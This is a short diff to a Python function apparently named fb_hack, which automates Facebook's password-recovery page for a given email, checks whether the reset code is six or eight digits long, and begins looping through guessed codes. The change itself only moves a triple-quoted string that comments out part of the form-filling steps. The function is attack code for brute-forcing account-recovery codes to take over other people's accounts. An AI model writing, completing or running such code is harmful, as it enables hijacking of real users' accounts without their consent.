@@ -49,7 +49,7 @@ def fb_hack(email, codex):
   browser.set_handle_refresh(False)
   browser.open('https://facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&_fb_noscript=l')
   browser.select_form(nr=0)
-  browser.form['email'] = email 
+  """browser.form['email'] = email 
   browser.click(coord=(364,48))
   browser.click(coord=(236,17))
   browser.form['email'] = email
@@ -71,7 +71,6 @@ def fb_hack(email, codex):
   check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
   check3 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
   check4 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
-  """
   if check1 == "Please check your email for a message with your code. Your code is 6 numbers long.":
     attempt1 = 0
     attempt2 = int(codex)
